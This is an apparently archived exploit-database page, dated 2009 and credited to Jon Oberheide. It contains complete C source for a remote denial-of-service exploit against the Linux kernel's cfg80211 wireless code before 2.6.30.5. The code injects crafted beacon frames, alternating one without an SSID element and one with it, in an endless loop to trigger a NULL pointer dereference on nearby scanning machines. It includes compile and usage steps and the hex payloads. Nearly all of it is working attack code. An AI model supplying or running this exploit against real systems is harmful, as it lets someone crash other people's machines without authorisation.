<html><head><title>Linux Kernel < 2.6.30.5 cfg80211 Remote Denial of Service Exploit</title></head><pre>/*
 * cfg80211-remote-dos.c
 *
 * Linux Kernel &lt; 2.6.30.5 cfg80211 Remote DoS
 * Jon Oberheide &lt;jon@oberheide.org&gt;
 * http://jon.oberheide.org
 * 
 * Information:
 *
 *   http://patchwork.kernel.org/patch/41218/
 *
 *   These pointers can be NULL, the is_mesh() case isn't ever hit in the 
 *   current kernel, but cmp_ies() can be hit under certain conditions.
 *
 * Usage:
 *
 *   $ gcc cfg80211-remote-dos.c -o cfg80211-remote-dos -lorcon
 *   $ airmon-ng start wlan0
 *   ...
 *   $ ./cfg80211-remote-dos mon0 mac80211
 *   [+] Initializing interface mon0...
 *   [+] Injecting crafted DoS beacon frames...
 *
 * Notes:
 *
 *   The NULL pointer dereference is triggered if the victim scans and receives
 *   a beacon frame that does not contain a SSID IE and then receives another 
 *   one that does have a SSID IE.  Raw frame injection via LORCON is required 
 *   on the wireless interface.  This should only affect the 2.6.30 series.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;

#include &lt;tx80211.h&gt;
#include &lt;tx80211_packet.h&gt;

#define BEACON_NOSSID \
	&quot;\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff&quot; \
	&quot;\x00\x03\x52\x00\x00\x00&quot; \
	&quot;\x00\x03\x52\x00\x00\x00&quot; \
	&quot;\x30\x4b&quot; \
	&quot;\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04&quot; \
	&quot;\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24&quot; \
	&quot;\x03\x01\x07&quot; \
	&quot;\x05\x04\x00\x01\x01\x00&quot; \
	&quot;\x2a\x01\x04&quot; \
	&quot;\x32\x04\x30\x48\x60\x6c&quot;
#define BEACON_NOSSID_LEN 64

#define BEACON_SSID \
	&quot;\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff&quot; \
	&quot;\x00\x03\x52\x00\x00\x00&quot; \
	&quot;\x00\x03\x52\x00\x00\x00&quot; \
	&quot;\x30\x4b&quot; \
	&quot;\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04&quot; \
	&quot;\x00\x03\x44\x6f\x53&quot; \
	&quot;\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24&quot; \
	&quot;\x03\x01\x07&quot; \
	&quot;\x05\x04\x00\x01\x01\x00&quot; \
	&quot;\x2a\x01\x04&quot; \
	&quot;\x32\x04\x30\x48\x60\x6c&quot;
#define BEACON_SSID_LEN 69

void
usage(char **argv)
{
	int i;
	struct tx80211_cardlist *cardlist;

	printf(&quot;Usage: %s [interface] [drivername]\n&quot;, argv[0]);

	cardlist = tx80211_getcardlist();

	if (cardlist == NULL) {
		printf(&quot;Error accessing supported cardlist.\n&quot;);
	} else {
		printf(&quot;\nSupported drivers are: &quot;);
		for (i = 1; i &lt; cardlist-&gt;num_cards; i++) {
			printf(&quot;%s &quot;, cardlist-&gt;cardnames[i]);
		}
		printf(&quot;\n&quot;);
	}
	tx80211_freecardlist(cardlist);
}

int
main(int argc, char **argv)
{
	struct tx80211 tx;
	struct tx80211_packet pkt;
	char p1[BEACON_NOSSID_LEN];
	char p2[BEACON_SSID_LEN];
	int ret, drivertype;
	uint8_t randbyte;

	if (argc &lt; 3) {
		usage(argv);
		return 0;
	}

	printf(&quot;[+] Initializing interface %s...\n&quot;, argv[1]);

	drivertype = tx80211_resolvecard(argv[2]);
	if (drivertype == INJ_NODRIVER) {
		printf(&quot;[-] Driver name not recognized.\n&quot;);
		exit(1);
	}

	ret = tx80211_init(&amp;tx, argv[1], drivertype);
	if (ret &lt; 0) {
		printf(&quot;[-] Error initializing %s/%s&quot;, argv[1], argv[2]);
		exit(1);
	}

	ret = tx80211_setfunctionalmode(&amp;tx, TX80211_FUNCMODE_INJMON);
	if (ret != 0) {
		printf(&quot;[-] Error setting monitor mode.\n&quot;);
		printf(&quot;[-] %s.\n&quot;, tx80211_geterrstr(&amp;tx));
		exit(1);
	}

	ret = tx80211_setchannel(&amp;tx, 11);
	if (ret &lt; 0) {
		printf(&quot;[-] Error setting channel.\n&quot;);
		printf(&quot;[-] %s.\n&quot;, tx80211_geterrstr(&amp;tx));
		exit(1);
	}

	ret = tx80211_open(&amp;tx);
	if (ret &lt; 0) {
		printf(&quot;[-] Unable to open interface %s\n&quot;, tx.ifname);
		printf(&quot;[-] %s.\n&quot;, tx80211_geterrstr(&amp;tx));
		exit(1);
	}

	srand(time(NULL));

	memcpy(p1, BEACON_NOSSID, BEACON_NOSSID_LEN);
	memcpy(p2, BEACON_SSID, BEACON_SSID_LEN);
	
	printf(&quot;[+] Injecting crafted DoS beacon frames...\n&quot;);

	while (1) {
		randbyte = rand() &amp; 0xff;
		p1[15] = randbyte;
		p1[21] = randbyte;
		p2[15] = randbyte;
		p2[21] = randbyte;

		pkt.packet = p1;
		pkt.plen = BEACON_NOSSID_LEN;
		if (tx80211_txpacket(&amp;tx, &amp;pkt) &lt; 0) {
			printf(&quot;[-] Unable to transmit packet.\n&quot;);
			printf(&quot;[-] %s.\n&quot;, tx80211_geterrstr(&amp;tx));
			exit(1);
		}

		pkt.packet = p2;
		pkt.plen = BEACON_SSID_LEN;
		if (tx80211_txpacket(&amp;tx, &amp;pkt) &lt; 0) {
			printf(&quot;[-] Unable to transmit packet.\n&quot;);
			printf(&quot;[-] %s.\n&quot;, tx80211_geterrstr(&amp;tx));
			exit(1);
		}
	}

	tx80211_close(&amp;tx);

	return 0;
}

// milw0rm.com [2009-08-18]</pre></html>